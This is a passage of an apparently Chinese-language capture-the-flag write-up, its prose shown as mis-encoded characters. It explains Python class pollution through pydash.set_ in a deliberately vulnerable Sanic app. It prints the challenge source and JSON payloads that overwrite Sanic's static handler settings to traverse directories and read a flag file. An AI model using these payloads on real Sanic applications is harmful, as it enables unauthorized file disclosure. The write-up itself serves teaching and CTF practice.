<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic</span> <span class="kn">import</span> <span class="n">Sanic</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic.response</span> <span class="kn">import</span> <span class="n">text</span><span class="p">,</span> <span class="n">html</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pydash</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pydash==5.1.2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#Ê∫êÁ†ÅÂ•ΩÂÉèË¢´adminÂà†Êéâ‰∫Ü‰∏Ä‰∫õÔºåÂê¨‰ªñËØ¥ÈáåÈù¢ËóèÊúâÂ§ßÁßòÂØÜ</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Pollute</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_log_dir</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">ret</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">num</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">letter</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span> <span class="mi">122</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">Letter</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">65</span><span class="p">,</span> <span class="mi">90</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">s</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">([</span><span class="n">num</span><span class="p">,</span> <span class="n">letter</span><span class="p">,</span> <span class="n">Letter</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">            <span class="n">ret</span> <span class="o">+=</span> <span class="n">s</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">ret</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Sanic</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">static</span><span class="p">(</span><span class="s2">&#34;/static/&#34;</span><span class="p">,</span> <span class="s2">&#34;./static/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/Wa58a1qEQ59857qQRPPQ&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">secret</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/h111int&#34;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">       <span class="n">hint</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="n">hint</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">index</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">html</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;static/index.html&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/adminLook&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">AdminLook</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#Êñπ‰æøÁÆ°ÁêÜÂëòÊü•ÁúãÈùûÊ≥ïÊó•Âøó</span>
</span></span><span class="line"><span class="cl">    <span class="n">log_dir</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;ls /tmp -al&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="n">log_dir</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/pollute&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">POLLUTE</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">value</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">key</span> <span class="ow">and</span> <span class="n">value</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span> <span class="ow">and</span> <span class="s1">&#39;parts&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">key</span> <span class="ow">and</span> <span class="s1">&#39;proc&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">value</span><span class="p">)</span> <span class="ow">is</span> <span class="ow">not</span> <span class="nb">list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">pollute</span> <span class="o">=</span> <span class="n">Pollute</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">pydash</span><span class="o">.</span><span class="n">set_</span><span class="p">(</span><span class="n">pollute</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;success&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">log_dir</span><span class="o">=</span><span class="n">create_log_dir</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">log_dir_bak</span><span class="o">=</span><span class="n">log_dir</span><span class="o">+</span><span class="s2">&#34;..&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">log_file</span><span class="o">=</span><span class="s2">&#34;/tmp/&#34;</span><span class="o">+</span><span class="n">log_dir</span><span class="o">+</span><span class="s2">&#34;/access.log&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">log_file_bak</span><span class="o">=</span><span class="s2">&#34;/tmp/&#34;</span><span class="o">+</span><span class="n">log_dir_bak</span><span class="o">+</span><span class="s2">&#34;/access.log.bak&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">=</span><span class="s1">&#39;key: &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;|&#39;</span><span class="o">+</span><span class="s1">&#39;value: &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#ÁîüÊàêÊó•ÂøóÊñá‰ª∂</span>
</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;mkdir /tmp/&#34;</span><span class="o">+</span><span class="n">log_dir</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">log_file</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">             <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">log</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#Â§á‰ªΩÊó•ÂøóÊñá‰ª∂</span>
</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;mkdir /tmp/&#34;</span><span class="o">+</span><span class="n">log_dir_bak</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">log_file_bak</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">             <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">log</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;ÔºÅÔºÅÔºÅÊ≠§Âú∞Á¶ÅÊ≠¢ËÉ°Êù•Ôºå‰Ω†ÁöÑÈùûÊ≥ïÊìç‰ΩúÂ∑≤ÁªèË¢´ËÆ∞ÂΩïÔºÅÔºÅÔºÅ&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèØ‰ª•ÁúãÂà∞Â§öÂá∫Êù•ÁöÑË∑ØÁî±:Wa58a1qEQ59857qQRPPQÔºåÊàë‰ª¨Áõ¥Êé•ËÆøÈóÆÂæóÂà∞hintÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag in /app,but you need to find his nameÔºÅÔºÅÔºÅ
</span></span><span class="line"><span class="cl">Find a way to see the file names in the app directory
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÈÇ£‰πàÂæàÊòéÊòæÊàë‰ª¨ÈúÄË¶ÅÊÉ≥ÂäûÊ≥ïÂàóÂá∫appÁõÆÂΩï‰∏ãÁöÑÊñá‰ª∂</p>
<p>ËøòÁúãÂà∞adminLookË∑ØÁî±ÂèØ‰ª•ÁúãÂà∞/tmpÁõÆÂΩï‰∏ãÁöÑÊñá‰ª∂ÔºåËÄåÊàë‰ª¨ÁöÑÈùûÊ≥ïÊó•ÂøóÂ∞±ËÆ∞ÂΩïÂú®Ê≠§ÁõÆÂΩï‰∏ãÔºåÊàë‰ª¨ÂÖàÈöè‰æøËß¶Âèë‰∏ÄÊ¨°ÈùûÊ≥ïËÆ∞ÂΩï,Â∞±ÊòØÊØîÂ¶ÇÊääkeyÁöÑÂÄºÁî®ÂàóË°®‰º†Ôºå</p>
<p>Êé•ÁùÄËÆøÈóÆadminLookË∑ØÁî±</p>
<p><img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328234242206.png"
	width="1824"
	height="598"
	srcset="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328234242206_hu14975426949740703532.png 480w, /p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328234242206_hu17419839198685726526.png 1024w"
	loading="lazy"
	
		alt="image-20250328234242206"
	
	
		class="gallery-image" 
		data-flex-grow="305"
		data-flex-basis="732px"
	
></p>
<p>Âá∫Áé∞Êó•ÂøóÁõÆÂΩïÔºåÈÇ£‰πàÂ∞±ÂèØ‰ª•Âà©Áî®ËÆøÈóÆËøô‰∏™ÁõÆÂΩïÂÆûÁé∞Á©øË∂äÂà∞‰∏äÂ±ÇÁõÆÂΩïÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;key&#34;:&#34;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&#34;,&#34;value&#34;: &#34;/tmp&#34;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>È¶ñÂÖàÂàáÊç¢Âà∞tmpÁõÆÂΩï‰∏ãÔºåÂÜçÊ±°ÊüìbaseÁöÑÂÄº:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;key&#34;:&#34;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.base&#34;,&#34;value&#34;: &#34;static/YPdeyP&#34;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂêåÊó∂ËÆ∞ÂæóÂºÄÂêØÂàóÁõÆÂΩïÂäüËÉΩ:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;key&#34;:&#34;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&#34;,&#34;value&#34;: true}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êé•ÁùÄËÆøÈóÆ/static/YPdeyP../Â∞±ËÉΩÁúãÂà∞flagÂêçÂ≠óÔºåÊé•ÁùÄÂÜçÊ±°ÊüìÂõûÊ†πÁõÆÂΩïÔºåÁÑ∂ÂêéËÆøÈóÆstatic/app/45W698WqtsgQT1_flagÂ∞±Ë°å‰∫Ü</p>
<p><img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328234816476.png"
	width="1241"
	height="335"
	srcset="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328234816476_hu14384759701713287701.png 480w, /p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328234816476_hu13290809883064569287.png 1024w"
	loading="lazy"
	
		alt="image-20250328234816476"
	
	
		class="gallery-image" 
		data-flex-grow="370"
		data-flex-basis="889px"
	
></p>
<p>Êé•‰∏ãÊù•ÂàÜÊûêÂéüÁêÜ</p>
<p>ÂâçÈù¢Áî®Âà∞Ëøô‰∏™static.handlerÔºåÈ¶ñÂÖàÊòØÊ†πÂü∫staticÂáΩÊï∞Ôºå‰πãÂêéË∑üËøõ<code>DirectoryHandler</code>Á±ª</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">directory_view</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_index</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">directory</span> <span class="o">/</span> <span class="n">current</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">request</span><span class="o">.</span><span class="n">app</span><span class="o">.</span><span class="n">debug</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂºÄÂêØÂàóÁõÆÂΩïÂäüËÉΩÂêéÔºåÂ∞±‰ºöË∞ÉÁî®_indexÊñπÊ≥ï</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_index</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">location</span><span class="p">:</span> <span class="n">Path</span><span class="p">,</span> <span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">debug</span><span class="p">:</span> <span class="nb">bool</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Remove empty path elements, append slash</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;//&#34;</span> <span class="ow">in</span> <span class="n">path</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">path</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">p</span><span class="si">}</span><span class="s2">/&#34;</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">path</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="n">p</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Render file browser</span>
</span></span><span class="line"><span class="cl">        <span class="n">page</span> <span class="o">=</span> <span class="n">DirectoryPage</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_iter_files</span><span class="p">(</span><span class="n">location</span><span class="p">),</span> <span class="n">path</span><span class="p">,</span> <span class="n">debug</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">html</span><span class="p">(</span><span class="n">page</span><span class="o">.</span><span class="n">render</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁúãÂà∞ËøôÈáåÂàóÂá∫ÁöÑÁõÆÂΩïË∑ØÂæÑÂ∞±ÊòØÁî±self.directory(ËøôÁé©ÊÑèÊòØ‰∏™ÂØπË±°ÔºåËøôÈáåÁöÑÂÄºÊòØÂÖ∂‰∏≠ÁöÑpartsÊéßÂà∂ÁöÑ)+currentÊãºÊé•ÂæóÂà∞ÁöÑ,Â¶ÇÊûúÊàëËÉΩÊéßÂà∂currentÁöÑÂÄºÔºå‰æãÂ¶Ç‰∏∫&quot;..&quot;ÔºåÈÇ£ËøôÊ†∑‰∏çÂ∞±ÂèØ‰ª•ÂÆûÁé∞ÁõÆÂΩïÁ©øË∂äÔºåÁõ¥Êé•ÂàóÂá∫‰∏äÂ±ÇÁõÆÂΩï‰∏ãÁöÑÊñá‰ª∂‰∫Ü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">        <span class="n">current</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)[</span><span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">base</span><span class="p">)</span> <span class="p">:]</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>  <span class="c1"># noqa: E203</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåpathÂú®Ë¢´ÂàÜÂâ≤ÁöÑÊó∂ÂÄôÊúâ‰∏™ÊÉÖÂÜµÔºåÂ∞±ÊòØÂ∞ÜË∑ØÂæÑ‰ªébaseÂ≠óÁ¨¶‰∏≤ÁªìÂ∞æÂºÄÂßãÁöÑÊâÄÊúâÂ≠óÁ¨¶‰∏≤ÂéªÊéâÂ§¥Â∞æÁöÑ<code>'/'</code>Â≠óÁ¨¶ÂêéËøîÂõûÔºå‰πüÂ∞±ÊòØËØ¥ÔºåÂΩìÊàë‰ª¨ÊääbaseÂ±ûÊÄßÊ±°ÊüìÊàêÊåáÂÆöÁöÑÂ≠óÁ¨¶‰∏≤‰πãÂêéÔºåÂêéÈù¢Â¶ÇÊûúÂá∫Áé∞‰∫Ü‰∏§‰∏™ÁÇπÔºå‰πüÂ∞±ÊòØ<code>..</code>Â∞±ËØ¥Êòé‰∫ÜcurrentËøîÂõûÁöÑÂ≠óÁ¨¶‰∏≤ÂèØËÉΩÂ≠òÂú®Ë∑ØÂæÑÁ©øË∂ä„ÄÇ</p>
<p>Ë¶ÅÊÉ≥ËÆ©currentÂèòÊàê..ÔºåÂ∞±ÂæóËÆøÈóÆ‰∏Ä‰∏™ÁõÆÂΩï,Â¶ÇÊûúÊàë‰ª¨Áõ¥Êé•ËÆøÈóÆ/static/ctf../</p>
<p>Ê≠§Êó∂ÁöÑbaseÊòØstatic,ËÄåcurrentÊòØctf..</p>
<p>ÊòæÁÑ∂Êàë‰ª¨ÊéßÂà∂base‰∏∫static/ctf,ÈÇ£‰πàctfÂ∞±‰ºö‰∏∫..‰∫Ü</p>
<p>ÊâÄ‰ª•ÂèØ‰ª•ÂÖàÊ±°ÊüìbaseÊàêstatic/ctf,Êé•ÁùÄÂÜçËÆøÈóÆstatic/ctf../Â∞±ËÉΩÂÆûÁé∞ÁõÆÂΩïÁ©øË∂ä</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">ÂéüÂûãÈìæÊ±°Êüì</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under 9u_l3</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Áõ∏ÂÖ≥ÊñáÁ´†</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">
        
        
            <div class="article-image">
                <img src="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/1.12f747bb3ec58fc56270470713ba0ba0.png" 
                        width="1920" 
                        height="1080" 
                        loading="lazy"
                        alt="Featured image of post pythonÂÜÖÂ≠òÈ©¨Â≠¶‰π†"
                        
                        data-hash="md5-EvdHuz7Fj8VicEcHE7oLoA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">pythonÂÜÖÂ≠òÈ©¨Â≠¶‰π†</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">
        
        
            <div class="article-image">
                <img src="/p/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.1b0b5baf2fbab6af45f40a9c0e824c92.png" 
                        width="1792" 
                        height="2560" 
                        loading="lazy"
                        alt="Featured image of post pythonÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥û"
                        
                        data-hash="md5-Gwtbry&#43;6tq9F9AqcDoJMkg==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">pythonÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥û</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
        
        
            <div class="article-image">
                <img src="/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.a84481e2accdd7ee83233c01f9ed1648.jpg" 
                        width="3363" 
                        height="5979" 
                        loading="lazy"
                        alt="Featured image of post pickleÂèçÂ∫èÂàóÂåñ"
                        
                        data-hash="md5-qESB4qzN1&#43;6DIzwB&#43;e0WSA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">pickleÂèçÂ∫èÂàóÂåñ</h2>
        </div>
    </a>
